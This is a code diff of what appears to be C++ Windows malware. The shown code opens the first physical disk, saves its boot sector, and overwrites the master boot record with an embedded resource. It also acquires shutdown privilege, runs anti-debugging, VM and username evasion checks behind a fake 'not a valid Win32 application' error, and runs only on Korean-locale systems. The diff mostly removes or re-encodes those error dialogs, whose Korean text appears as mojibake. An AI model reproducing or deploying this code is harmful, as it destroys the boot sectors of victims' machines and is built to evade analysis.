@@ -18,7 +18,6 @@ protected:
 		hDisk = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
 		
 		if(hDisk == INVALID_HANDLE_VALUE){
-			MessageBoxA(0, "юл га╥н╠в╥╔ю╨ ©ц╧ы╦╔ Win32 юю©К га╥н╠в╥╔юл ╬ф╢у╢о╢ы.", "©ю╥Ы", MB_ICONERROR);
 			return FALSE;
 		}
 
@@ -31,7 +30,6 @@ protected:
 		lpRes = LockResource(hGlob);
 
 		if(SizeofResource(NULL, hRsrc) != 0x200){
-			MessageBoxA(0, "юл га╥н╠в╥╔ю╨ ©ц╧ы╦╔ Win32 юю©К га╥н╠в╥╔юл ╬ф╢у╢о╢ы.", "©ю╥Ы", MB_ICONERROR);
 			return FALSE;
 		}
 
@@ -44,7 +42,6 @@ protected:
 	BOOL GetBackup(){
 		SetFilePointer(hDisk, 0, 0, FILE_BEGIN);
 		if(!ReadFile(hDisk, lpBackup, 0x200, &Bytes, NULL)){
-			MessageBoxA(0, "юл га╥н╠в╥╔ю╨ ©ц╧ы╦╔ Win32 юю©К га╥н╠в╥╔юл ╬ф╢у╢о╢ы.", "©ю╥Ы", MB_ICONERROR);
 			return FALSE;
 		}
 		return TRUE;
@@ -63,29 +60,24 @@ public:
 
 	BOOL ExploitMBR(){
 		if(!OpenHardDisk()){
-			MessageBoxA(0, "юл га╥н╠в╥╔ю╨ ©ц╧ы╦╔ Win32 юю©К га╥н╠в╥╔юл ╬ф╢у╢о╢ы.", "©ю╥Ы", MB_ICONERROR);
 			return FALSE;
 		}
 
 		if(!GetResource()){
-			MessageBoxA(0, "юл га╥н╠в╥╔ю╨ ©ц╧ы╦╔ Win32 юю©К га╥н╠в╥╔юл ╬ф╢у╢о╢ы.", "©ю╥Ы", MB_ICONERROR);
 			return FALSE;
 		}
 
 		if(!GetBackup()){
-			MessageBoxA(0, "юл га╥н╠в╥╔ю╨ ©ц╧ы╦╔ Win32 юю©К га╥н╠в╥╔юл ╬ф╢у╢о╢ы.", "©ю╥Ы", MB_ICONERROR);
 			return FALSE;
 		}
 
 		SetFilePointer(hDisk, 0, 0, FILE_BEGIN);
 
 		if(!WriteFile(hDisk, lpBuffer, 0x200, &Bytes, NULL)){
-			MessageBoxA(0, "юл га╥н╠в╥╔ю╨ ©ц╧ы╦╔ Win32 юю©К га╥н╠в╥╔юл ╬ф╢у╢о╢ы.", "©ю╥Ы", MB_ICONERROR);
 			return FALSE;
 		}
 
 		if(!WriteFile(hDisk, lpBackup, 0x200, &Bytes, NULL)){
-			MessageBoxA(0, "юл га╥н╠в╥╔ю╨ ©ц╧ы╦╔ Win32 юю©К га╥н╠в╥╔юл ╬ф╢у╢о╢ы.", "©ю╥Ы", MB_ICONERROR);
 			return FALSE;
 		}
 
@@ -101,12 +93,10 @@ protected:
 		struct _LUID luid;
 
 		if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)){
-			MessageBoxA(0, "юл га╥н╠в╥╔ю╨ ©ц╧ы╦╔ Win32 юю©К га╥н╠в╥╔юл ╬ф╢у╢о╢ы.", "©ю╥Ы", MB_ICONERROR);
 			return FALSE;
 		}
 
 		if(!LookupPrivilegeValueA(NULL, lpPrivilege, &luid)){
-			MessageBoxA(0, "юл га╥н╠в╥╔ю╨ ©ц╧ы╦╔ Win32 юю©К га╥н╠в╥╔юл ╬ф╢у╢о╢ы.", "©ю╥Ы", MB_ICONERROR);
 			return FALSE;
 		}
 
@@ -115,7 +105,6 @@ protected:
 		tp.Privileges[0].Luid = luid;
 
 		if(!AdjustTokenPrivileges(hToken, FALSE, &tp, NULL, NULL, NULL)){
-			MessageBoxA(0, "юл га╥н╠в╥╔ю╨ ©ц╧ы╦╔ Win32 юю©К га╥н╠в╥╔юл ╬ф╢у╢о╢ы.", "©ю╥Ы", MB_ICONERROR);
 			return FALSE;
 		}
 
@@ -127,7 +116,6 @@ public:
 		ULONG Response;
 
 		if(!GetPrivilege("SeShutdownPrivilege")){
-			MessageBoxA(0, "юл га╥н╠в╥╔ю╨ ©ц╧ы╦╔ Win32 юю©К га╥н╠в╥╔юл ╬ф╢у╢о╢ы.", "©ю╥Ы", MB_ICONERROR);
 			return FALSE;
 		}
 
@@ -152,7 +140,6 @@ class Anti_Reversing{
 public:
 	BOOL BeingDebugged(){
 		if(IsDebuggerPresent()){
-			MessageBoxA(0, "юл га╥н╠в╥╔ю╨ ©ц╧ы╦╔ Win32 юю©К га╥н╠в╥╔юл ╬ф╢у╢о╢ы.", "©ю╥Ы", MB_ICONERROR);
 			ExitProcess(0);
 			return TRUE;
 		}
@@ -161,7 +148,6 @@ public:
 
 	BOOL RemoteDebugger(){
 		if(CheckRemoteDebuggerPresent(GetCurrentProcess(), FALSE)){
-			MessageBoxA(0, "юл га╥н╠в╥╔ю╨ ©ц╧ы╦╔ Win32 юю©К га╥н╠в╥╔юл ╬ф╢у╢о╢ы.", "©ю╥Ы", MB_ICONERROR);
 			ExitProcess(0);
 			return TRUE;
 		}
@@ -253,29 +239,29 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszCmdPa
 	class Anti_Reversing anti = Anti_Reversing();
 
 	if(anti.UserName() == TRUE){
-		MessageBoxA(0, "юл га╥н╠в╥╔ю╨ ©ц╧ы╦╔ Win32 юю©К га╥н╠в╥╔юл ╬ф╢у╢о╢ы.", "©ю╥Ы", MB_ICONERROR);
+		MessageBoxA(0, "Л²╢ М■└К║°Й╥╦К·╗Л²─ Л≤╛К╟■К╔╦ Win32 Л²▒Л ╘ М■└К║°Й╥╦К·╗Л²╢ Л∙└К▀≥К▀┬К▀╓.", "Л≤╓К╔≤", MB_ICONERROR);
 		return TRUE;
 	}
 
 	if(anti.IsVMWARE() == TRUE){
-		MessageBoxA(0, "юл га╥н╠в╥╔ю╨ ©ц╧ы╦╔ Win32 юю©К га╥н╠в╥╔юл ╬ф╢у╢о╢ы.", "©ю╥Ы", MB_ICONERROR);
+		MessageBoxA(0, "Л²╢ М■└К║°Й╥╦К·╗Л²─ Л≤╛К╟■К╔╦ Win32 Л²▒Л ╘ М■└К║°Й╥╦К·╗Л²╢ Л∙└К▀≥К▀┬К▀╓.", "Л≤╓К╔≤", MB_ICONERROR);
 		return TRUE;
 	}
 
 	if(anti.BeingDebugged()){
-		MessageBoxA(0, "юл га╥н╠в╥╔ю╨ ©ц╧ы╦╔ Win32 юю©К га╥н╠в╥╔юл ╬ф╢у╢о╢ы.", "©ю╥Ы", MB_ICONERROR);
+		MessageBoxA(0, "Л²╢ М■└К║°Й╥╦К·╗Л²─ Л≤╛К╟■К╔╦ Win32 Л²▒Л ╘ М■└К║°Й╥╦К·╗Л²╢ Л∙└К▀≥К▀┬К▀╓.", "Л≤╓К╔≤", MB_ICONERROR);
 		return TRUE;
 	}
 
 	if(anti.RemoteDebugger()){
-		MessageBoxA(0, "юл га╥н╠в╥╔ю╨ ©ц╧ы╦╔ Win32 юю©К га╥н╠в╥╔юл ╬ф╢у╢о╢ы.", "©ю╥Ы", MB_ICONERROR);
+		MessageBoxA(0, "Л²╢ М■└К║°Й╥╦К·╗Л²─ Л≤╛К╟■К╔╦ Win32 Л²▒Л ╘ М■└К║°Й╥╦К·╗Л²╢ Л∙└К▀≥К▀┬К▀╓.", "Л≤╓К╔≤", MB_ICONERROR);
 		return TRUE;
 	}
 
 	anti.InformationThread();
 
 	if(anti.InformationProcess()){
-		MessageBoxA(0, "юл га╥н╠в╥╔ю╨ ©ц╧ы╦╔ Win32 юю©К га╥н╠в╥╔юл ╬ф╢у╢о╢ы.", "©ю╥Ы", MB_ICONERROR);
+		MessageBoxA(0, "Л²╢ М■└К║°Й╥╦К·╗Л²─ Л≤╛К╟■К╔╦ Win32 Л²▒Л ╘ М■└К║°Й╥╦К·╗Л²╢ Л∙└К▀≥К▀┬К▀╓.", "Л≤╓К╔≤", MB_ICONERROR);
 		return TRUE;
 	}
 
@@ -283,7 +269,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszCmdPa
 	class SystemExploit system = SystemExploit();
 
 	if(!system.IsKorean()){
-		MessageBoxA(0, "юл га╥н╠в╥╔ю╨ ©ц╧ы╦╔ Win32 юю©К га╥н╠в╥╔юл ╬ф╢у╢о╢ы.", "©ю╥Ы", MB_ICONERROR);
+		MessageBoxA(0, "Л²╢ М■└К║°Й╥╦К·╗Л²─ Л≤╛К╟■К╔╦ Win32 Л²▒Л ╘ М■└К║°Й╥╦К·╗Л²╢ Л∙└К▀≥К▀┬К▀╓.", "Л≤╓К╔≤", MB_ICONERROR);
 		return FALSE;
 	}
 
